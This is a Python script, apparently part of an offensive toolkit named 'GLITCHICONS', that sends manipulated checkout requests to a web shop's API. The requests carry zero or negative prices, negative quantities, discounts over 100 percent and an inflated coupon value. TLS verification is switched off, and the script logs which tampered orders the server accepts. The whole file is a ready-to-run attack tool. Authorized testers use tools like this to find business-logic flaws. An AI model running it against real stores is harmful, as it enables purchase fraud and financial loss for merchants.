"""
GLITCHICONS ⬡ — Price Manipulator v1.0
Tests: negative price, zero price, integer overflow
"""
import requests, sys, time, json
from pathlib import Path
from datetime import datetime
from rich.console import Console
from rich.panel import Panel

console = Console()

PRICE_PAYLOADS = [
    {"price": 0},
    {"price": -1},
    {"price": 0.001},
    {"price": -100},
    {"quantity": -1},
    {"quantity": 0},
    {"amount": 0},
    {"total": -1},
    {"discount": 100},
    {"discount": 101},
    {"coupon_value": 999999},
]

def test_price_manipulation(
    url, base_payload=None,
    cookies=None, headers=None, delay=0.5
):
    """Test price manipulation in checkout/cart endpoints."""
    console.print(Panel(
        "[bold purple]⬡ PRICE MANIPULATOR[/bold purple]\n"
        f"[dim]Target: {url}[/dim]",
        border_style="purple"
    ))
    session = requests.Session()
    if cookies:
        session.cookies.update(cookies)
    if headers:
        session.headers.update(headers)

    findings = []
    if not base_payload:
        base_payload = {}

    for test in PRICE_PAYLOADS:
        payload = base_payload.copy()
        payload.update(test)
        try:
            r = session.post(
                url, json=payload,
                timeout=10, verify=False
            )
            field = list(test.keys())[0]
            value = list(test.values())[0]

            if r.status_code in [200, 201]:
                console.print(
                    f"  [yellow]⚠ ACCEPTED: {field}={value} "
                    f"→ {r.status_code}[/yellow]"
                )
                findings.append({
                    "type"   : "PRICE_ACCEPTED",
                    "field"  : field,
                    "value"  : value,
                    "status" : r.status_code,
                    "sample" : r.text[:200]
                })
            else:
                console.print(
                    f"  [green]REJECTED: {field}={value} "
                    f"→ {r.status_code}[/green]"
                )
            time.sleep(delay)
        except Exception as e:
            console.print(f"  [dim]Error: {e}[/dim]")

    console.print(
        f"\n[bold]Total: {len(findings)} accepted[/bold]"
    )
    return findings

if __name__ == "__main__":
    import warnings; warnings.filterwarnings("ignore")
    test_price_manipulation(
        sys.argv[1] if len(sys.argv) > 1 else
        "https://target.example.com/api/checkout"
    )
